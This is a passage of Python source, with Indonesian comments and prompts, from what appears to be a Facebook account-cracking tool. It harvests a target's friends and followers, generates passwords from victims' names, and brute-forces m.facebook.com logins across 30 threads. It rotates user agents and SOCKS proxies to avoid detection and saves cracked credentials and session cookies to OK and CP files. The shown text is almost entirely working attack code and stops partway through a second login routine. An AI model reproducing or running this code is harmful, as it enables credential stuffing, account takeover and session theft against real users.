		cini = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(10000)&access_token=%s'%(put,token),cookies=coki).json()
		for fak in cini['subscribers']['data']:
			try:id3.append(fak['id']+'|'+fak['name'])
			except:continue
		#print(maling_pangsit+" nama target :%s %s"(H,lk))
		x=f"{P2}nama target : {H2}{lk}\n{P2}total friends : {H2}{len(id)}\n{P2}total followers : {H2}{len(id3)}"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		settingers()
	except requests.exceptions.ConnectionError:
		jalan(garis+" koneksi internet bermasalah ")
		exit()
	except (KeyError,IOError):
		jalan(garis+" gagal dump id... mungkin privat friends/gada friends nya") 
		exit()
	
def settingers():
	print("")
	x=f"\t\t{P2}khusus crack public\n{P2}[01] crack urutan new ({H2}public crack{P2})\n{P2}[02] crack urutan old ({H2}public crack{P2})\n{P2}[03] crack urutan random ({H2}public crack{P2})\n\t\t{P2}khusus crack followers\n{P2}[04] crack urutan new ({H2}followers crack{P2})\n{P2}[05] crack urutan old ({H2}followers crack{P2})\n{P2}[06] crack urutan random ({H2}followers crack{P2})"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	GlukTzy = input(garis+" pilih : "+H)
	if GlukTzy in ['2','02']:
		for bacot in id:
			id2.append(bacot)
	elif GlukTzy in ['1','01']:
		for bacot in id:
			id2.insert(0,bacot)
	elif GlukTzy in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	elif GlukTzy in ['5','05']:
		for kont in id3:
			id4.append(kont)
	elif GlukTzy in ['4','04']:
		for kont in id3:
			id4.insert(0,kont)
	elif GlukTzy in ['6','06']:
		for kont in id3:
			xx = random.randint(0,len(id4))
			id4.insert(xx,bacot)
	else:
		jalan(garis+" isi yang benar")
		settingers()
	crack_public_pilihan()

def crack_public_pilihan():
	print("")
	x=f"{P2}[01] methode mobile ({H2}slowed cracked{P2})\n{P2}[02] methode mbasic ({K2}fast cracked{P2})\n{P2}[03] methode free   ({M2}not recommended{P2})\n{P2}[04] methode mobile version 2 ({H2}new{P2})\n{P2}[05] methode b-api  ({H2}very fast cracked{P2})"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	met = input(garis+" pilih : "+H)
	if met in ["1","01","a"]:
		metode.append("mobile")
	elif met in ["2","02","b"]:
		metode.append("mbasic")
	elif met in ["3","03","c"]:
		metode.append("free")
	elif met in ["4","04"]:
		metode.append("mobile_v2")
	elif met in ["5","05"]:
		metode.append("bapi")
	else:
		metode.append("mobile")
	print("")
	pw_tambahani = input(garis+" ingin menambahkan password tambahan ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	if pw_tambahani in ["y","Y","yes","Ya","Yes"]:
		pw_tambahan.append("ya")
		x=f"{P2}contoh password tambahan : {H2}anjing,ngentot,sayang "
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		pw_nya_cok = input(garis+" password tambahan :"+H+" ")
		pw_gw=pw_nya_cok.split(',')
		for cpw in pw_gw:
			pw_ni.append(cpw)
	elif pw_tambahani in ["t","T","Tidak","tidak","no"]:
		pw_tambahan.append("no")
	else:
		pw_tambahan.append("no")
	nanya_proxy = input(garis+" ingin menambahkan proxy tambahan ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	if nanya_proxy in ["y","Y","yes","Ya"]:
		proxp()
	elif nanya_proxy in ["t","T","tidak","Tidak"]:
		proxp()
	else:
		proxp()
	uar = input(f"{garis} ingin memasukan ua tambahan kamu ({H}y{P}/{M}t{P}) ? : {H}")
	if uar in ["y","Y","ya"]:
		ua = input(f"{garis} masukan ua : {H}")
		ugent = open('useragent.txt','w')
		ugent.write(ua)
		ugent.close()
	elif uar in ["t","T","tidak"]:
		pass
	else:
		jalan(f"{garis} isi yang benar ")
		crack_public_pilihan()
	tamtttl = input(garis+" ingin memunculkan ttl akun cp/ok ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	if tamtttl in ["y","Y","ya"]:
		tampilkan_ttl.append("ya")
	elif tamtttl in ["t","T","tidak"]:
		tampilkan_ttl.append("no")
	else:
		tampilkan_ttl.append("no")
	nanya_opsi = input(garis+" ingin memunculkan opsi detect ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	if nanya_opsi in ["y","ya","Y"]:
		tampilkan_opsi.append("ya")
	elif nanya_opsi in ["t","T","tidak"]:
		tampilkan_opsi.append("no")
	else:
		tampilkan_opsi.append("no")
	nanya_apk = input(garis+" ingin memunculkan aplikasi terkait ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	if nanya_apk in ["y","ya","Y"]:
		tampilkan_apk.append("ya")
	elif nanya_apk in ["t","T","tidak"]:
		tampilkan_apk.append("no")
	else:
		tampilkan_apk.append("no")
	pw_tambahai = input(garis+" ingin menambahkan password belakang nama ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	if pw_tambahai in ["y","Y","yes","Ya","Yes"]:
		pw_belakang.append("ya")
		x=f"{P2}contoh password belakang : {H2}anjing,ngentot,sayang "
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		pw_nya_cok = input(garis+" password belakang nama :"+H+" ")
		pw_gw=pw_nya_cok.split(',')
		for cpw in pw_gw:
			pw_lu.append(cpw)
	elif pw_tambahai in ["t","T","Tidak","tidak","no"]:
		pw_belakang.append("no")
	else:
		pw_belakang.append("no")
	pilpas = input(garis+" ingin memakai password manual ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	if pilpas in ["y","Y","ya","yes"]:
		with tread(max_workers=30) as HikmatXF:
			x=f"{P2}contoh password : {H2}anjing,ngentot,sayang "
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			listpass = input(garis+"%s list password :%s "%(P,H))
			if len(listpass)<=5:
				exit("\n"+garis+"%s password minimal 6 angka"%(M))
			x=f"{P2}list password crack {H2}{listpass}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			print("")
			x=f"{P2}hasil crack ok tersimpan di {H2}OK/{sekarang}.txt\n{P2}hasil crack cp tersimpan di {K2}CP/{sekarang}.txt\n{P2}kalo tidak ada hasil coba mode pesawat 5 detik trus hidupin lagi data nya\nmoga dapet banyak yakk result nya "
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			print("")
			for user in id:
				HikmatXF.submit(mobile, user, listpass.split(","))
		print("")
		if len(ok) != 0 or len(cp) != 0:
			x=f"{P2}hasil cp mu : {K2}{len(cp)}\n{P2}hasil ok mu : {H2}{len(ok)}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(garis+" kembali ")
			menu()
		else:
			x=f"{P2}kok gada hasil? makanya ganteng klo gk ganteng kemungkinan kecil dapet result, intinya harus ganteng ajg:v"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(garis+" kembali ")
			menu()
	elif pilpas in ["t","T","tidak","Tidak"]:
		passwer()

def passwer():
	print("")
	x=f"{P2}hasil crack ok tersimpan di {H2}OK/{sekarang}.txt\n{P2}hasil crack cp tersimpan di {K2}CP/{sekarang}.txt\n{P2}kalo tidak ada hasil coba mode pesawat 5 detik trus hidupin lagi data nya\nmoga dapet banyak yakk result nya "
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	print("")
	with tread(max_workers=30) as HikmatXD:
		for koncol in id2 or id4:
			uiz,mmk = koncol.split('|')[0],koncol.split('|')[1].lower()
			prot = mmk.split(' ')[0]
			pwr = []
			if len(mmk)<6:
				if len(prot)<3:
					pass
				else:
					pwr.append(prot+'123')
					pwr.append(prot+'12345')
					pwr.append(prot+'1234')
					pwr.append(prot+'123456')
			else:
				if len(prot)<3:
					pwr.append(mmk)
				else:
					pwr.append(mmk)
					pwr.append(prot+'123')
					pwr.append(prot+'12345')
					pwr.append(prot+'1234')
					pwr.append(prot+'123456')
			if 'ya' in pw_tambahan:
				for xnxr in pw_ni:
					pwr.append(xnxr)
			if 'ya' in pw_belakang:
				for asoe in pw_lu:
					pwr.append(prot+asoe)
			else:pass
			if 'mobile' in metode:
				HikmatXD.submit(mobile,uiz,pwr)
			elif 'mbasic' in metode:
				HikmatXD.submit(mbasic,uiz,pwr)
			elif 'free' in metode:
				HikmatXD.submit(free,uiz,pwr)
			elif "mobile_v2" in metode:
				HikmatXD.submit(mobile_v2,uiz,pwr)
			elif "bapi" in metode:
				HikmatXD.submit(api,uiz,pwr)
			else:
				HikmatXD.submit(mobile,uiz,pwr)
	print("")
	if ok != 0 or cp != 0:
		x=f"{P2}hasil cp mu : {K2}{cp}\n{P2}hasil ok mu : {H2}{ok}"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		input(garis+" kembali ")
		menu()
	else:
		x=f"{P2}kok gada hasil? makanya ganteng klo gk ganteng kemungkinan kecil dapet result, intinya harus ganteng ajg:v"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		input(garis+" kembali ")
		menu()
		
def mobile(uiz,pwr):
	global ok,cp,HikmatXD
	ua_crack = ["Mozilla/5.0 (Linux; Android 10; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; TECNO CG6j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; Qmobile_4Gplus; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Mobile; Tech_Pad_Kaios_One_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.1","Mozilla/5.0 (X11; CrOS armv7l 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.187 Safari/537.36 Mozilla/5.0 (Mobile; Nokia 8000 4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.4","Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2","Mozilla/5.0 (Mobile; LYF/F300B/LYF-F300B-001-01-15-130718-i;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5 Edg/93.0.4577.63","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-45-051119;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LOGIC_LOGIC_B8K_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Linux; rv:48.0; U; US) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-50-091120;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; Digit_Digit4G_4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	runc= random.choice([K,M,U,O,B,H]) 
	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
	for pw in pwr:
		pw = pw.lower()
		try:
			proxff= open('proxy_mat.txt','r').read().splitlines()
			cuukk=random.choice(proxff)
			proxs= {'http': 'socks4://'+cuukk}
			#proxs2= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				if "ya" in tampilkan_opsi:
					opsi_detect(uiz,pw)
				elif "no" in tampilkan_opsi:
					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
					cp+=1
					break
				if "no" in tampilkan_ttl:
					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
					cp+=1
					break
				elif "ya" in tampilkan_ttl:
					try:
						token = open('token.txt','r').read()
						cookie = open('cookie.txt','r').read()
						coki = {"cookie":cookie}
						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
						x = json.loads(xn.text)
						ttl = x['birthday']
						nama_ = x["name"]
						#id_ = x["id"]
						print("\r %s*--> %s|%s|%s|%s • %s "%(K,nama_,uiz,pw,ttl,tahun(uiz)))
						open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print("\r %s*--> %s|%s • %s "%(K,uiz,pw,tahun(uiz)))
					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				if "no" in tampilkan_ttl:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
				elif "ya" in tampilkan_ttl:
					try:
						coki=po.cookies.get_dict()
						kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
						token = open('token.txt','r').read()
						cookie = open('cookie.txt','r').read()
						coki = {"cookie":cookie}
						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
						x = json.loads(xn.text)
						ttl = x['birthday']
						nama_ = x["name"]
						print("\r %s*--> %s|%s|%s|%s • %s "%(H,nama_,uiz,pw,ttl,tahun(uiz)))
						print("\r %s*--> %s "%(H,kuki))
						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
						ok+=1
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print("\r %s*--> %s|%s • %s "%(H,uiz,pw,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
				else:continue
				break
					
			else:
				continue
		except requests.exceptions.ConnectionError:
			turu(31)
	HikmatXD+=1
	
def mobile_v2(uiz,pwr):
	global ok,cp,HikmatXD
	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	runc= random.choice([K,M,U,O,B,H])
	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
	for pw in pwr:
		pw = pw.lower()
		try:
			proxff= open('proxy_mat.txt','r').read().splitlines()
			cuukk=random.choice(proxff)
			proxs= {'http': 'socks4://'+cuukk}
			#proxs2= {'http': 'socks4://'+nip}
			url = "m.facebook.com"
			headers1= {
				"Host": url,
				"cache-control": "max-age=0",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101"',
				"sec-ch-ua-mobile": "?1",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"sec-fetch-user": "?1",
				"upgrade-insecure-requests": "1",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			p = ses.get(f"https://{url}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{url}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",headers=headers1)
			data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"uid":uiz,
				"next":f"https://{url}/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
				"pass":pw,
				"flow":"login_no_pin"}
			kuko = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			kuko += " m_pixel_ratio=2.625; wd=412x756"
			headers2 = {
				"Host": url,
				"connection": "keep-alive",
				"cache-control": "max-age=0",
				"save-data": "on",
				"origin": "https://m.facebook.com",
				"content-type": "application/x-www-form-urlencoded",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with": "com.facebook.katana",
				"dnt": "1",
				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101"',
				"sec-ch-ua-platform": '"Android"',
				"sec-ch-ua-mobile": "?1",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"sec-fetch-user": "?1",
				"upgrade-insecure-requests": "1",
				"referer": f"https://{url}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{url}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
				"accept-encoding": "gzip, deflate br",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=headers2, cookies={"cookie": kuko}, proxies=proxs, allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				if "ya" in tampilkan_opsi:
					opsi_detect(uiz,pw)
				elif "no" in tampilkan_opsi:
					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
					cp+=1
					break
				if "no" in tampilkan_ttl:
					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
					cp+=1
					break
				elif "ya" in tampilkan_ttl:
					try:
						token = open('token.txt','r').read()
						cookie = open('cookie.txt','r').read()
						coki = {"cookie":cookie}
						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
						x = json.loads(xn.text)
						ttl = x['birthday']
						nama_ = x["name"]
						#id_ = x["id"]
